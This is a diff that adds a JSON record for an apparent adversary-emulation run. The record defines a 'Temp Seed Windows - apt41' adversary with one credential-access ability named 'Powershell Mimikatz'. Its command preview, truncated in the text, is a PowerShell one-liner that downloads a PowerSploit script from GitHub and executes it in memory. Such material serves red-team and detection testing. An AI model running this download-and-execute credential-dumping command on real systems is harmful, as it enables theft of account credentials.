@@ -1,0 +1,21 @@
+{
+  "saved": true,
+  "adversary": {
+    "adversary_id": "temp-seed-fgdafj-1775111360",
+    "name": "Temp Seed Windows - apt41",
+    "description": "Auto-generated seed adversary from 2f945820-21cf-4b15-9ed2-33faaa6f0fb9 for agent fgdafj",
+    "atomic_ordering": [
+      "82dcefb5c3512d73bf2248cb0127c4ae"
+    ]
+  },
+  "selected_abilities": [
+    {
+      "ability_id": "82dcefb5c3512d73bf2248cb0127c4ae",
+      "name": "Powershell Mimikatz",
+      "tactic": "credential-access",
+      "technique_id": "T1003.001",
+      "noisy_score": 1,
+      "command_preview": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/Po…"
+    }
+  ]
+}
